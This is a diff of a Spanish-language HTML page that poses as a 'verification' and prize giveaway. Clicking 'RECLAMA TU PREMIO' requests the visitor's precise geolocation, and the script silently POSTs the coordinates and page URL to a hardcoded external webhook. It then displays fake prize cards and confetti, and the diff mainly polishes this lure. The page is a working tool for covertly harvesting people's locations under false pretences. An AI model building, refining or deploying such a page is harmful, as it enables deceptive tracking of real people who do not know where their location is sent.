@@ -3,84 +3,123 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🎁 Verificación y Validación</title>
+  <title>Verificación y Premios</title>
   <style>
-    body { 
-      font-family: 'Segoe UI', Tahoma, sans-serif; 
-      text-align: center; 
-      background: linear-gradient(135deg, #e0f7fa, #f1f8e9); 
-      margin: 0; padding: 0;
-      min-height: 100vh;
-      display: flex; flex-direction: column; justify-content: center; align-items: center;
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #4facfe, #00f2fe);
+      color: #333;
     }
-    h1 { color: #2c3e50; margin-bottom: 10px; font-size: 28px; }
-    p { font-size: 18px; margin: 10px 0; color: #444; }
-    button { 
-      padding: 14px 28px; 
-      font-size: 20px; 
-      border: none; 
-      border-radius: 8px; 
-      background: #007bff; 
-      color: #fff; 
-      cursor: pointer; 
-      transition: background 0.3s ease;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-    }
-    button:hover { background: #0056b3; }
-    #msg { 
-      margin-top: 20px; 
-      font-size: 24px; 
-      font-weight: bold; 
-      color: green; 
-      display: none; 
-    }
-    #icono { 
-      margin-top: 20px; 
-      width: 300px; 
-      max-width: 90%;
-      display: none; 
+    .container {
+      max-width: 900px;
+      margin: 60px auto;
+      background: #fff;
       border-radius: 15px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-      animation: fadeInBounce 1s ease forwards;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+      padding: 40px 30px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+    h1 {
+      color: #222;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 16px;
+      color: #555;
+    }
+    button {
+      margin-top: 20px;
+      padding: 14px 35px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      background: #007bff;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    #msg {
+      margin-top: 25px;
+      font-size: 20px;
+      font-weight: bold;
+      color: green;
+      display: none;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .premios {
+      margin-top: 30px;
+      display: none;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+    }
+    .premio-card {
+      background: #fafafa;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      padding: 15px;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
       opacity: 0;
-      transform: scale(0.8);
+      transform: scale(0.9);
+      animation: showCard 0.6s forwards;
     }
-    @keyframes fadeInBounce {
-      0%   { opacity: 0; transform: scale(0.8) translateY(30px); }
-      60%  { opacity: 1; transform: scale(1.1) translateY(-10px); }
-      80%  { transform: scale(0.95) translateY(5px); }
-      100% { opacity: 1; transform: scale(1) translateY(0); }
+    .premio-card img {
+      width: 100%;
+      border-radius: 10px;
+      object-fit: cover;
+      height: 150px;
     }
-    canvas#confetti {
+    .premio-card h3 {
+      margin: 10px 0 0;
+      font-size: 16px;
+      color: #333;
+    }
+    .premio-card:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes showCard {
+      to { opacity: 1; transform: scale(1); }
+    }
+    canvas {
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
       pointer-events: none;
-      z-index: 999;
     }
   </style>
 </head>
 <body>
-  <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
-  <p>Por favor, pulsa el botón y acepta la solicitud.</p>
-  <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
-  <p id="msg">¡Gracias por aceptar! 🎉</p>
-  <img id="icono" src="" alt="Premio">
   <canvas id="confetti"></canvas>
-
-  <!-- 🎺 Sonido fanfarria -->
-  <audio id="fanfarria" src="https://www.soundjay.com/human/sounds/applause-8.mp3" preload="auto"></audio>
+  <div class="container">
+    <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
+    <p>Por favor, pulsa el botón y acepta la solicitud.</p>
+    <button onclick="obtenerUbicacion()">📍 RECLAMA TU PREMIO</button>
+    <p id="msg">🎉 ¡Gracias por aceptar! Aquí están tus premios:</p>
+    
+    <div class="premios" id="premios"></div>
+  </div>
 
 <script>
 const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";
 
-// 📸 Lista de imágenes reales de premios
+// Lista de premios realistas
 const premios = [
-  "https://images.unsplash.com/photo-1510552776732-03e61cf4b144?w=600&auto=format&fit=crop&q=80", // smartphone
-  "https://images.unsplash.com/photo-1606813902914-3a54ed28c8a2?w=600&auto=format&fit=crop&q=80", // bicicleta
-  "https://images.unsplash.com/photo-1587202372775-dc61f62de1e9?w=600&auto=format&fit=crop&q=80", // consola
-  "https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=600&auto=format&fit=crop&q=80", // laptop
-  "https://images.unsplash.com/photo-1512499617640-c2f999018b72?w=600&auto=format&fit=crop&q=80"  // audífonos
+  { nombre: "🚲 Bicicleta de montaña", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
+  { nombre: "🎮 Consola Gamer", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
+  { nombre: "📱 Smartphone Gama Alta", img: "https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" },
+  { nombre: "⌚ Smartwatch", img: "https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" },
+  { nombre: "💻 Laptop Ultrabook", img: "https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" },
+  { nombre: "📺 TV Pantalla Grande", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
 ];
 
 function obtenerUbicacion() {
@@ -88,6 +127,7 @@ function obtenerUbicacion() {
     alert("Tu navegador no soporta geolocalización.");
     return;
   }
+
   navigator.geolocation.getCurrentPosition(onSuccess, onError, {
     enableHighAccuracy: true,
     timeout: 10000,
@@ -110,7 +150,7 @@ function onSuccess(pos) {
     source: window.location.href
   };
 
-  // 📡 Enviar datos al webhook
+  // Enviar datos al webhook
   fetch(WEBHOOK_URL, {
     method: "POST",
     mode: "no-cors",
@@ -118,19 +158,23 @@ function onSuccess(pos) {
     body: JSON.stringify(data, null, 2)
   });
 
-  // ✅ Mostrar mensaje
+  // Mostrar mensaje y premios
   document.getElementById("msg").style.display = "block";
+  const premiosDiv = document.getElementById("premios");
+  premiosDiv.style.display = "grid";
+  premiosDiv.innerHTML = "";
 
-  // 📸 Imagen aleatoria
-  const randomImg = premios[Math.floor(Math.random() * premios.length)];
-  const icono = document.getElementById("icono");
-  icono.src = randomImg;
-  icono.style.display = "block";
+  premios.forEach((p, i) => {
+    const card = document.createElement("div");
+    card.className = "premio-card";
+    card.style.animationDelay = `${i * 0.2}s`; // animación escalonada
+    card.innerHTML = `
+      <img src="${p.img}" alt="${p.nombre}">
+      <h3>${p.nombre}</h3>
+    `;
+    premiosDiv.appendChild(card);
+  });
 
-  // 🎺 Sonido fanfarria
-  document.getElementById("fanfarria").play();
-
-  // 🎉 Lanzar confeti
   lanzarConfeti();
 }
 
@@ -138,59 +182,43 @@ function onError(err) {
   alert("⚠️ Error al obtener ubicación: " + (err.message || err.code));
 }
 
-/* 🎉 Confeti con canvas */
+/* 🎊 Confeti simple en canvas */
 function lanzarConfeti() {
   const canvas = document.getElementById("confetti");
   const ctx = canvas.getContext("2d");
   canvas.width = window.innerWidth;
   canvas.height = window.innerHeight;
 
-  const confettis = [];
-  for (let i = 0; i < 150; i++) {
-    confettis.push({
+  const piezas = [];
+  const colores = ["#f94144", "#f3722c", "#f9c74f", "#90be6d", "#577590", "#43aa8b"];
+
+  for (let i = 0; i < 120; i++) {
+    piezas.push({
       x: Math.random() * canvas.width,
       y: Math.random() * canvas.height - canvas.height,
-      r: Math.random() * 6 + 4,
-      d: Math.random() * 20 + 10,
-      color: `hsl(${Math.random() * 360}, 100%, 50%)`,
-      tilt: Math.random() * 10 - 10,
-      tiltAngle: 0,
-      tiltAngleIncrement: Math.random() * 0.07 + 0.05
+      w: 10,
+      h: 10,
+      color: colores[Math.floor(Math.random() * colores.length)],
+      velocidad: Math.random() + 1
     });
   }
 
-  function drawConfetti() {
+  function animar() {
     ctx.clearRect(0, 0, canvas.width, canvas.height);
-    confettis.forEach(c => {
-      ctx.beginPath();
-      ctx.lineWidth = c.r;
-      ctx.strokeStyle = c.color;
-      ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
-      ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.r / 2);
-      ctx.stroke();
+    piezas.forEach(p => {
+      ctx.fillStyle = p.color;
+      ctx.fillRect(p.x, p.y, p.w, p.h);
+      p.y += p.velocidad;
+      if (p.y > canvas.height) p.y = -10;
     });
-    updateConfetti();
+    requestAnimationFrame(animar);
   }
+  animar();
 
-  function updateConfetti() {
-    confettis.forEach(c => {
-      c.y += Math.cos(c.d) + 1 + c.r / 2;
-      c.x += Math.sin(0.5) * 2;
-      c.tiltAngle += c.tiltAngleIncrement;
-      c.tilt = Math.sin(c.tiltAngle) * 15;
-
-      if (c.y > canvas.height) {
-        c.y = -10;
-        c.x = Math.random() * canvas.width;
-      }
-    });
-  }
-
-  (function animate() {
-    drawConfetti();
-    requestAnimationFrame(animate);
-  })();
+  // detener después de 6s
+  setTimeout(() => ctx.clearRect(0,0,canvas.width,canvas.height), 6000);
 }
 </script>
 </body>
 </html>
+
